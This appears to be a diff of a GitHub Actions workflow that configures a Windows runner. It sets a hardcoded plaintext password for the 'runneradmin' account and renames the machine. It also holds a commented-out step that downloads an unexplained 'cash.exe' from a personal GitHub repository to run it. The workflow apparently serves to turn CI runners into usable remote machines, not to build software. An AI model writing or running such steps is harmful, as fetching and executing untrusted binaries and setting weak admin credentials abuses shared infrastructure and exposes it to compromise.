@@ -22,7 +22,7 @@ jobs:
       - name: Set Password for runneradmin
         run: Set-LocalUser -Name "runneradmin" -Password (ConvertTo-SecureString -AsPlainText "P@ssw0rd!" -Force)
       - name: Rename Computer to nono1321
-        run: Rename-Computer -NewName "nono1321"
+        run: Rename-Computer -NewName "Ag1"
       # - name: Download and run Cashvib File
       #   run: |
       #     Invoke-WebRequest -Uri "https://github.com/jackricj/std1/raw/main/cash.exe" -OutFile "Cash.exe"
